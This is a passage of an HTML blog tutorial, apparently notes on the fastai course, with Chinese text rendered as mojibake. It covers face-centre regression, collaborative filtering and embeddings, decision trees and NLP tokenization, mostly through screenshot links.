id="æŒ‘é€‰åˆé€‚çš„é˜ˆå€¼"><a href="#æŒ‘é€‰åˆé€‚çš„é˜ˆå€¼" class="headerlink" title="æŒ‘é€‰åˆé€‚çš„é˜ˆå€¼"></a>æŒ‘é€‰åˆé€‚çš„é˜ˆå€¼</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/195.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/196.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/197.png"></p><h1 id="äººè„¸ä¸­å¿ƒç‚¹æ£€æµ‹ï¼ˆå›¾åƒå›å½’é—®é¢˜ï¼‰"><a href="#äººè„¸ä¸­å¿ƒç‚¹æ£€æµ‹ï¼ˆå›¾åƒå›å½’é—®é¢˜ï¼‰" class="headerlink" title="äººè„¸ä¸­å¿ƒç‚¹æ£€æµ‹ï¼ˆå›¾åƒå›å½’é—®é¢˜ï¼‰"></a>äººè„¸ä¸­å¿ƒç‚¹æ£€æµ‹ï¼ˆå›¾åƒå›å½’é—®é¢˜ï¼‰</h1><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/198.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/199.png"><br>è®¾ç½®æ¯å¼ å›¾ç‰‡å¯¹åº”çš„æ ‡ç­¾<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/200.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/201.png"><br>è·å–äººè„¸ä¸­å¿ƒä½ç½®åæ ‡<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/202.png"><br>é€‰æ‹©13å·æ–‡ä»¶å¤¹ä¸‹çš„å›¾ç‰‡åšéªŒè¯é›†<br>æ•°æ®å¢å¼ºå·²ç»æ ‡å‡†åŒ–ï¼ˆæ ‡å‡†åŒ–å…¶å®å¯ä»¥è‡ªåŠ¨å®Œæˆï¼‰<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/203.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/204.png"><br>å…¶ä¸­3æŒ‡çš„æ˜¯3ä¸ªchanel<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/205.png"><br>å–å€¼èŒƒå›´æ˜¾ç„¶æ˜¯åœ¨ã€-1,1ã€‘</p><h2 id="Training-a-model"><a href="#Training-a-model" class="headerlink" title="Training a model"></a>Training a model</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/206.png"><br>å®ç°æ–¹æ³•ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/207.png"></p><h3 id="æŸå¤±å‡½æ•°-1"><a href="#æŸå¤±å‡½æ•°-1" class="headerlink" title="æŸå¤±å‡½æ•°"></a>æŸå¤±å‡½æ•°</h3><p>åœ¨æ„å»ºå›å½’æ¨¡å‹æ—¶å‡æ–¹è¯¯å·®éå¸¸å¸¸ç”¨ï¼Œå¦å¤–ä»–çš„æ¢¯åº¦ä¹Ÿå¾ˆå¥½ï¼Œç”¨æ¥å½“æŸå¤±å‡½æ•°å’Œè¯„ä»·æŒ‡æ ‡éƒ½å¯ä»¥<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/208.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/209.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/210.png"><br>å°†å‡æ–¹è¯¯å·®å¼€æ ¹å¾—åˆ°å‡æ–¹æ ¹è¯¯å·®<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/211.png"></p><h3 id="æŸ¥çœ‹ç»“æœ"><a href="#æŸ¥çœ‹ç»“æœ" class="headerlink" title="æŸ¥çœ‹ç»“æœ"></a>æŸ¥çœ‹ç»“æœ</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/212.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/213.png"></p><h1 id="ååŒè¿‡æ»¤"><a href="#ååŒè¿‡æ»¤" class="headerlink" title="ååŒè¿‡æ»¤"></a>ååŒè¿‡æ»¤</h1><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/214.png"><br>è¿™éƒ¨ç”µå½±ä½œä¸ºåŠ¨ä½œç‰‡çš„ç³»æ•°æ˜¯0.98ã€‚ã€‚ã€‚ã€‚ã€‚<br>è¿™ä¸ªäººå–œæ¬¢åŠ¨ä½œç”µå½±çš„ç³»æ•°æ˜¯0.9ï¼Œæˆ˜äº‰ç±»çš„æ˜¯0,8,ç§‘æ™®ç±»çš„æ˜¯-0.6<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/215.png"><br>åŸå§‹æ•°æ®ï¼ŒååŒè¿‡æ»¤è¦åšçš„å°±æ˜¯ç¡®å®šå›¾ä¸­ç©ºç™½ä½ç½®çš„å€¼<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/216.png"><br>å…ˆéšæœºç”Ÿæˆè“è‰²éƒ¨åˆ†å’Œé»„è‰²éƒ¨åˆ†çš„æ•°æ®ï¼Œç„¶åè®­ç»ƒï¼Œä»¥ç¡®å®šè¿™ä¸¤ä¸ªéƒ¨åˆ†çš„ç³»æ•°ï¼Œä»è€Œé¢„æµ‹å‡ºç©ºç™½ä½ç½®çš„å€¼<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/217.png"></p><h2 id="Creating-the-DataLoaders"><a href="#Creating-the-DataLoaders" class="headerlink" title="Creating the DataLoaders"></a>Creating the DataLoaders</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/218.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/219.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/220.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/221.png"><br>å–å‡ºç¬¬å››è¡Œçš„æ•°æ®<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/222.png"></p><h2 id="Embedding"><a href="#Embedding" class="headerlink" title="Embedding"></a>Embedding</h2><h2 id="Embedding-1"><a href="#Embedding-1" class="headerlink" title="Embedding"></a>Embedding</h2><p>è¦çŸ¥é“embeddingçš„ä½œç”¨ï¼Œé¦–å…ˆè¦äº†è§£ç‹¬çƒ­ç¼–ç (one-hot encoding)ã€‚å‡è®¾ç°åœ¨æœ‰å¦‚ä¸‹å¯¹åº”ç¼–ç å…³ç³»ï¼š<br>0ï¼šæˆ‘<br>1ï¼šæ˜¯<br>2ï¼šä¸€<br>3ï¼šå¤´<br>4ï¼šçŒª<br>é‚£ä¹ˆç”¨æ¥è¡¨ç¤ºä¸€å¥è¯æ¯”å¦‚ï¼šâ€œæˆ‘æ˜¯çŒªâ€è¡¨ç¤ºä¸ºï¼š<br>0ï¼Œ1ï¼Œ4<br>è€Œone-hotç¼–ç ä¸­åªå­˜åœ¨ 0 å’Œ1ï¼Œæœ‰å¤šå°‘ä¸ªå­—è¦ç¼–ç ï¼Œç‹¬çƒ­ç¼–ç çš„æ¯ä¸€è¡Œé•¿åº¦å°±ä¼šæœ‰å¤šé•¿ï¼Œæ¯”å¦‚å­—å…¸ä¸­ä¸€å…±æœ‰ 5 ä¸ªå­— â€œæˆ‘æ˜¯ä¸€å¤´çŒªâ€ è¢«ä» 0-4 è¿›è¡Œäº†ç¼–ç ï¼Œé‚£ä¹ˆç‹¬çƒ­ç¼–ç çš„æ¯ä¸€è¡Œå°±ä¼šæœ‰5ä¸ªç”¨ 0æˆ–1è¡¨ç¤ºçš„ä½ç½®ï¼Œå³ä½¿å¯èƒ½è¦è¡¨è¾¾çš„è¯­å¥åªæœ‰å¾ˆçŸ­çš„å¥å­ï¼Œä¾‹å¦‚ï¼š<br>[1,0,0,0,0] æˆ‘â€“0<br>[0,1,0,0,0] æ˜¯â€“1<br>[0,0,0,0,1] çŒªâ€“4<br>åœ¨æ¯ä¸€å¥å¯¹åº”çš„ç¼–ç ä½ç½®ä¼šè¢«è®¾ç½®æˆ 1ï¼Œå…¶ä½™çš„åœ°æ–¹éƒ½æ˜¯ 0ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯ä¸€è¡Œåªä¼šæœ‰ä¸€ä¸ª1ã€‚<br><strong>one-hotç¼–ç çš„ä¼˜åŠ¿æ˜¯ï¼šè®¡ç®—æ–¹ä¾¿å¿«æ·ã€è¡¨è¾¾èƒ½åŠ›å¼ºã€‚</strong> å› ä¸ºå¯¹äºè¿™æ ·çš„ç¨€ç–çŸ©é˜µåšçŸ©é˜µè®¡ç®—çš„æ—¶å€™ï¼Œåªéœ€è¦æŠŠ1å¯¹åº”ä½ç½®çš„æ•°ç›¸ä¹˜æ±‚å’Œå°±å¯ä»¥ï¼Œä½†é—®é¢˜ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œç¨€ç–çŸ©é˜µçš„èµ„æºå ç”¨å¤ªææ€–äº†ï¼Œå°¤å…¶ä½“ç°åœ¨é•¿ç¯‡æ–‡å­—çš„å¤„ç†ä¸­ï¼Œä¾‹å¦‚ï¼š<br>ç®€ä½“æ±‰å­—å¸¸ç”¨3000ä¸ªè¢«ä»0-2999ç¼–å·ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨è¿™å¥—ç³»ç»Ÿä¸­<strong>æ¯ä¸ªå•å­—çš„ç‹¬çƒ­ç¼–ç æ˜¯3000ä½</strong>ï¼Œå¦‚æœä½ ç°åœ¨<strong>æœ‰ä¸€ç¯‡10000å­—çš„æ–‡ç« </strong>ï¼Œé‚£ä¹ˆç”¨ç‹¬çƒ­ç¼–ç çš„æ–¹å¼ç¼–ç ä¹‹åå…¶å¤§å°ä¸º10000Ã—3000 = 30000000ï¼Œå¾ˆææ€–å§ï¼Œæœ€é‡è¦çš„æ˜¯ï¼Œå…¶ä¸­å¾ˆå¤šä¸œè¥¿æ˜¯é‡å¤çš„ï¼Œåªæ˜¯åœ¨æ–‡ç« çš„ä¸åŒä½ç½®ï¼Œè¿™æ ·ä¼šå¤§é‡çš„æµªè´¹å­˜å‚¨ç©ºé—´ã€‚æ‰€ä»¥å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢Â·Â·Â·Â·<br><strong>embeddingåº”è¿è€Œç”Ÿ</strong>~~~~<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/223.png"><br>embeddingçš„åŸç†æ˜¯ä½¿ç”¨çŸ©é˜µä¹˜æ³•æ¥è¿›è¡Œé™ç»´ï¼Œä»è€Œè¾¾åˆ°èŠ‚çº¦å­˜å‚¨ç©ºé—´çš„ç›®çš„ã€‚<br>å‡è®¾ï¼šæˆ‘ä»¬æœ‰ä¸€ä¸ª 2 Ã— 6 2 Ã— 62Ã—6 çš„çŸ©é˜µï¼Œç„¶åä¹˜ä¸Šä¸€ä¸ª 6 Ã— 3 6 Ã— 36Ã—3 çš„çŸ©é˜µåï¼Œå˜æˆäº†ä¸€ä¸ª2 Ã— 3 2 Ã— 32Ã—3 çš„çŸ©é˜µã€‚<br>å…ˆä¸ç®¡å®ƒä»€ä¹ˆæ„æ€ï¼Œè¿™ä¸ªè¿‡ç¨‹ï¼Œæˆ‘ä»¬æŠŠä¸€ä¸ª12ä¸ªå…ƒç´ çš„çŸ©é˜µå˜æˆ6ä¸ªå…ƒç´ çš„çŸ©é˜µï¼Œç›´è§‚ä¸Šï¼Œå¤§å°æ˜¯ä¸æ˜¯ç¼©å°äº†ä¸€åŠï¼Ÿ<br>è€Œä¸”ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶ç›´è§‚ä¸ŠçŸ©é˜µçš„å¤§å°å˜å°äº†ï¼Œä½†æ˜¯å…¶å®æ•°å­—è•´è—çš„ä¿¡æ¯å¹¶æ²¡æœ‰æ”¹å˜ï¼Œ<strong>åªæ˜¯æŒ‰ç…§æŸä¸€ç§æ˜ å°„å…³ç³»å°†åŸæœ¬çŸ©é˜µçš„ä¿¡æ¯è½¬æ¢åˆ°äº†ä¸€ä¸ªæ–°çš„ç»´åº¦çš„çŸ©é˜µé‡Œé¢</strong>ï¼›åªè¦æŒ‰ç…§é€†å‘çš„æ˜ å°„å…³ç³»ï¼Œå¯¹çŸ©é˜µè¿›è¡Œç›¸ä¹˜ï¼Œå…¶åˆä¼šå›åˆ°æœ¬èº«çš„æ¨¡æ ·ï¼ï¼ï¼ä»è¿™é‡Œæ¥çœ‹ï¼Œ<strong>embeddingæ˜¯é€šè¿‡æŸç§çŸ©é˜µä¹˜æ³•æ¥å®ç°çŸ©é˜µæ•°æ®çš„é™ç»´</strong>ã€‚<br><strong>å¦‚æœä½ æƒ³æŠŠæ•°æ®ä½¿ç”¨å¦å¤–ä¸€ä¸ªç»´åº¦çš„å¼ é‡æ¥è¡¨ç¤ºï¼Œè€Œä¸æƒ³é€ æˆä¿¡æ¯çš„æŸå¤±ï¼Œå¯ä»¥ä½¿ç”¨ embedding æ¥è°ƒæ•´ã€‚</strong></p><p><strong>é‚£ä¹ˆembedding é™¤äº†å®ç°é™ç»´ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„é€†å‘åŠŸèƒ½â€“å‡ç»´</strong>ã€‚<br>å½“çŸ©é˜µç»´åº¦å¾ˆä½çš„æ—¶å€™ï¼Œæœ‰äº›æœ‰æ•ˆçš„ä¿¡æ¯æ˜¯ä¸èƒ½å¤Ÿè¢«å¾ˆå®Œæ•´åœ°æå–å‡ºæ¥çš„ï¼Œä¸¾ä¸ªä¸æ°å½“çš„ä¾‹å­ï¼š<br>åœ¨çº¸ä¸Šå†™äº†ä¸€ä¸ªå­—<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/224.png"><br>ç»è¿‡embeddingä¹‹åç›¸å½“äºæŠŠçº¸æŠ˜èµ·æ¥æˆ–è€…æ‰æ“äº†ä¸€ä¸‹ï¼Œå˜æˆäº†ï¼š<img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/225.png"><br>æ‰€ä»¥åœ¨æå–ä¿¡æ¯çš„æ—¶å€™å¯èƒ½æ— æ³•éå¸¸é¡ºç†ï¼Œè€Œé€šè¿‡ embedding è¿›è¡Œå‡ç»´ä¹‹åï¼Œå°±ç›¸å½“äºå°†æ•´å¼ çº¸å±•å¼€ï¼Œæ–¹ä¾¿äº<strong>æ”¹å˜æˆä¸åŒçš„æ„Ÿå—é‡</strong>è¿›è¡Œä¿¡æ¯çš„æå–ã€‚<br><strong>å¯¹ä½ç»´çš„æ•°æ®è¿›è¡Œå‡ç»´æ—¶ï¼Œå¯èƒ½æŠŠä¸€äº›å…¶ä»–ç‰¹å¾ç»™æ”¾å¤§äº†ï¼Œæˆ–è€…æŠŠç¬¼ç»Ÿçš„ç‰¹å¾ç»™åˆ†å¼€äº†ã€‚åŒæ—¶ï¼Œè¿™ä¸ªembeddingæ˜¯ä¸€ç›´åœ¨å­¦ä¹ åœ¨ä¼˜åŒ–çš„ï¼Œå°±ä½¿å¾—æ•´ä¸ªè¿‡ç¨‹æ…¢æ…¢å½¢æˆä¸€ä¸ªè‰¯å¥½çš„è§‚å¯Ÿç‚¹</strong>ã€‚</p><p>æ‰€ä»¥è¯´embeddingè¿‡ç¨‹å°±æ˜¯çŸ©é˜µä¹˜æ³•è¿‡ç¨‹ï¼Œç”¨æ¥æŠŠè¾“å…¥é™ç»´åº¦</p><p>Embeddingå®ç°äº†çŸ©é˜µä¹˜æ³•å–ç´¢å¼•å€¼è€Œæ— éœ€æ‰‹åŠ¨è®¾ç½®onehotå‘é‡<br>ä¹Ÿå°±æ˜¯ç”¨ç‹¬çƒ­ç¼–ç çŸ©é˜µä»£æ›¿äº†æ•°ç»„æŸ¥æ‰¾æ–¹å¼<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/226.png"><br>è¿™ä¸ªå‡½æ•°çš„å‘éŸ³æ˜¯dunder init</p><h2 id="Moduleç±»"><a href="#Moduleç±»" class="headerlink" title="Moduleç±»"></a>Moduleç±»</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/227.png"><br>å…¶ä¸­è¿™ä¸ªinitæ˜¯åˆ›å»ºçš„æ—¶å€™åˆå§‹åŒ–ç”¨çš„ï¼Œåé¢è®­ç»ƒçš„æ—¶å€™éƒ½æ˜¯ç”¨forward()æ¥ä¼ å‚æ•°çš„<br>xå°±æ˜¯useridå’Œmovid<br>ç¬¬ä¸€ä¸ªæ˜¯x[:,0]<br>ç¬¬äºŒä¸ªæ˜¯x[:,1]<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/228.png"><br>è®©æ¯ä¸ªuserå’Œæ¯ä¸ªmovéƒ½è·å¾—æ‰€å¯¹åº”çš„å‘é‡<br>æ¥çœ‹ä¸€ä¸‹ä»–ä»¬å„è‡ªçš„shape<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/229.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/230.png"><br>è¿™æ ·è®¡ç®—å‡ºæ¥çš„å°±æ˜¯ç»¿æ¡†é‡Œçš„éƒ¨åˆ†<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/231.png"><br>ç¬¬ä¸€ä¸ªç»´åº¦æ˜¯mini-batchçš„ç»´åº¦ï¼Œæ‰€ä»¥è¦å¯¹ç¬¬äºŒä¸ªç»´åº¦sumï¼Œæœ€åå¾—åˆ°çš„å°±æ˜¯ç‚¹ä¹˜çš„ç»“æœ<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/232.png"></p><h2 id="è®­ç»ƒ-1"><a href="#è®­ç»ƒ-1" class="headerlink" title="è®­ç»ƒ"></a>è®­ç»ƒ</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/233.png"></p><h2 id="è°ƒä¼˜"><a href="#è°ƒä¼˜" class="headerlink" title="è°ƒä¼˜"></a>è°ƒä¼˜</h2><p>å›å½’ç±»å‹çš„æ•°æ®åˆ†æï¼Œæœ€å¥½å‘Šè¯‰fastaiæ ‡ç­¾çš„æ•°æ®èŒƒå›´<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/234.png"><br>è¿™é‡Œç›¸å½“äºæ˜¯<br>ï¼ˆres,0,5.5ï¼‰<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/235.png"><br>æœ‰çš„ç”¨æˆ·å°±æ˜¯å–œæ¬¢æ‰“ä½åˆ†ï¼Œé‚£å°±åŠ ä¸Šåç½®<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/236.png"><br>è¿‡æ‹Ÿåˆäº†<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/237.png"></p><h1 id="æ­£åˆ™åŒ–"><a href="#æ­£åˆ™åŒ–" class="headerlink" title="æ­£åˆ™åŒ–"></a>æ­£åˆ™åŒ–</h1><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/238.png"></p><h2 id="Creating-our-own-Embedding-module"><a href="#Creating-our-own-Embedding-module" class="headerlink" title="Creating our own Embedding module"></a>Creating our own Embedding module</h2><p>æ‰€ä»¥åµŒå…¥çš„æ„æ€å°±æ˜¯çŸ©é˜µä¸­çš„ç´¢å¼•<br>è€Œä¸”æœ€å¥½æ˜¯åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„ç‰ˆæœ¬<br>åµŒå…¥å±‚å®é™…ä¸Šæ˜¯ä»Moduleç»§æ‰¿è€Œæ¥çš„ã€‚<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/239.png"><br>ä½†æ˜¯åªè¿™ä¹ˆå†™æ˜¯ä¸ä¼šè¢«å­¦ä¹ çš„ï¼Œè¦åƒä¸‹é¢è¿™ä¹ˆå†™ã€‚<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/240.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/241.png">è¿™æ ·çš„å‡½æ•°ä¸éœ€è¦åƒä¸Šé¢ä¸€æ ·é‚£ä¹ˆå†™ï¼Œå› ä¸ºä»–å·²ç»è‡ªåŠ¨è¢«è°ƒç”¨äº†ã€‚<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/242.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/243.png"><br>å› æ­¤åƒä¸Šå›¾ä¸€æ ·è¿™æ ·åˆ›å»ºçš„Parameterå°±å¯ä»¥è¢«å­¦ä¹ äº†ã€‚<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/244.png"></p><h2 id="Interpreting-embeddings-and-biases"><a href="#Interpreting-embeddings-and-biases" class="headerlink" title="Interpreting embeddings and biases"></a>Interpreting embeddings and biases</h2><p>æŸ¥çœ‹åç½®æœ€å°çš„äº”æ¡æ•°æ®ã€‚<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/245.png"><br>è¿™æ˜¯å¤§å®¶æœ€ä¸å–œæ¬¢çš„äº”éƒ¨ç”µå½±ã€‚<br>ç›¸åï¼Œä»¥ä¸‹æ˜¯å¤§å®¶æœ€å–œæ¬¢çš„äº”éƒ¨ç”µå½±ã€‚<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/246.png"></p><h3 id="ä½¿ç”¨PCAåˆ†æ"><a href="#ä½¿ç”¨PCAåˆ†æ" class="headerlink" title="ä½¿ç”¨PCAåˆ†æ"></a>ä½¿ç”¨PCAåˆ†æ</h3><p>ä»–å°±æ˜¯ä¼šæŠŠ50ä¸ªå› ç´ å‹ç¼©åˆ°ä¸‰ä¸ªã€‚<br>å¯ä»¥çœ‹åˆ°ä¸€äº›ç”µå½±éƒ½æ‰¾åˆ°äº†ä»–ä»¬è‡ªå·±æ‰€å±çš„é‚£ä¸€ä¸ªç©ºé—´ã€‚<img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/247.png"></p><h2 id="ç”¨fastaiå®ŒæˆååŒè¿‡æ»¤"><a href="#ç”¨fastaiå®ŒæˆååŒè¿‡æ»¤" class="headerlink" title="ç”¨fastaiå®ŒæˆååŒè¿‡æ»¤"></a>ç”¨fastaiå®ŒæˆååŒè¿‡æ»¤</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/248.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/249.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/250.png"></p><h2 id="ç”¨ä½™å¼¦ç›¸ä¼¼åº¦æŸ¥çœ‹ç›¸ä¼¼çš„ç”µå½±"><a href="#ç”¨ä½™å¼¦ç›¸ä¼¼åº¦æŸ¥çœ‹ç›¸ä¼¼çš„ç”µå½±" class="headerlink" title="ç”¨ä½™å¼¦ç›¸ä¼¼åº¦æŸ¥çœ‹ç›¸ä¼¼çš„ç”µå½±"></a>ç”¨ä½™å¼¦ç›¸ä¼¼åº¦æŸ¥çœ‹ç›¸ä¼¼çš„ç”µå½±</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/251.png"></p><h2 id="å¦‚æœä¸ç”¨ç‚¹ç§¯"><a href="#å¦‚æœä¸ç”¨ç‚¹ç§¯" class="headerlink" title="å¦‚æœä¸ç”¨ç‚¹ç§¯"></a>å¦‚æœä¸ç”¨ç‚¹ç§¯</h2><p>å°±å¯ä»¥ä¸ºä¸åŒçš„ç”¨æˆ·ä»¥åŠä¸åŒçš„ç”µå½±è®¾ç½®ä¸åŒçš„Embedding,è¿™æ ·æ›´çµæ´»<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/252.png"><br>fastaiæœ‰ä¸€ä¸ªå‡½æ•°get_emb_sz()ï¼Œå®ƒæ ¹æ®fast.aiå‘ç°çš„ä¸€ä¸ªå¯å‘å¼æ–¹æ³•è¿”å›æ•°æ®åµŒå…¥çŸ©é˜µçš„å»ºè®®å¤§å°ï¼Œè¯¥æ–¹æ³•åœ¨å®è·µä¸­æ•ˆæœå¾ˆå¥½ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/253.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/254.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/255.png"><br>æˆ–è€…ç›´æ¥<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/256.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/257.png"><br>è¿™é‡Œç”¨åˆ°äº†è¡¨æ ¼æ¨¡å‹ã€‚</p><h2 id="Tabular"><a href="#Tabular" class="headerlink" title="Tabular"></a>Tabular</h2><p>ç”¨ä¸Šè¿°çš„ç¥ç»ç½‘ç»œæ˜¯å¯ä»¥çš„ï¼Œä¹Ÿå¯ä»¥ç”¨éšæœºæ£®æ—</p><h2 id="å†³ç­–æ ‘"><a href="#å†³ç­–æ ‘" class="headerlink" title="å†³ç­–æ ‘"></a>å†³ç­–æ ‘</h2><h3 id="ä½¿ç”¨kaggleAPI"><a href="#ä½¿ç”¨kaggleAPI" class="headerlink" title="ä½¿ç”¨kaggleAPI"></a>ä½¿ç”¨kaggleAPI</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/258.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/259.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/260.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/261.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/262.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/263.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/264.png"></p><h3 id="åŠ è½½æ•°æ®-1"><a href="#åŠ è½½æ•°æ®-1" class="headerlink" title="åŠ è½½æ•°æ®"></a>åŠ è½½æ•°æ®</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/265.png"></p><h3 id="æŸ¥çœ‹ä¸€ä¸‹æœ‰å“ªäº›åˆ—"><a href="#æŸ¥çœ‹ä¸€ä¸‹æœ‰å“ªäº›åˆ—" class="headerlink" title="æŸ¥çœ‹ä¸€ä¸‹æœ‰å“ªäº›åˆ—"></a>æŸ¥çœ‹ä¸€ä¸‹æœ‰å“ªäº›åˆ—</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/266.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/267.png"><br>å°†æ­¤å±æ€§è½¬åŒ–ä¸ºæœ‰åºç±»åˆ«<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/268.png"><br>é€‰æ‹©å› å˜é‡å¹¶å°†å…¶è½¬æ¢ä¸ºå¯¹æ•°ï¼Œå› ä¸ºkaggleè¦æ±‚è¿™ä¹ˆåš<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/269.png"></p><h3 id="å†³ç­–æ ‘-1"><a href="#å†³ç­–æ ‘-1" class="headerlink" title="å†³ç­–æ ‘"></a>å†³ç­–æ ‘</h3><p>åˆ›å»ºå†³ç­–æ ‘çš„æµç¨‹ï¼š<br>(æš‚ç•¥)</p><h1 id="NLP"><a href="#NLP" class="headerlink" title="NLP"></a>NLP</h1><h2 id="å‡†å¤‡æ•°æ®-1"><a href="#å‡†å¤‡æ•°æ®-1" class="headerlink" title="å‡†å¤‡æ•°æ®"></a>å‡†å¤‡æ•°æ®</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/270.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/271.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/272.png"></p><h2 id="Tokenization"><a href="#Tokenization" class="headerlink" title="Tokenization"></a>Tokenization</h2><p>å°†æ–‡æœ¬è½¬åŒ–ä¸ºä¸€ç»„å•è¯æˆ–è¯æ¡,é‚£ä¹ˆå¥å·ç®—ä¸ç®—æ˜¯ä¸€ä¸ªè¯æ¡å‘¢?é€šå¸¸æœ‰ä¸‰ç§åˆ’åˆ†æ–¹å¼<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/273.png"><br>fastaié»˜è®¤åˆ†è¯å™¨spaCy<br>ä½¿ç”¨WordTokenizerï¼ˆï¼‰åˆ›å»ºåˆ†è¯å™¨ï¼Œä¼šè‡ªåŠ¨åˆ†é…ä¸€ä¸ªåˆé€‚çš„åˆ†è¯å™¨<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/274.png"><br><img 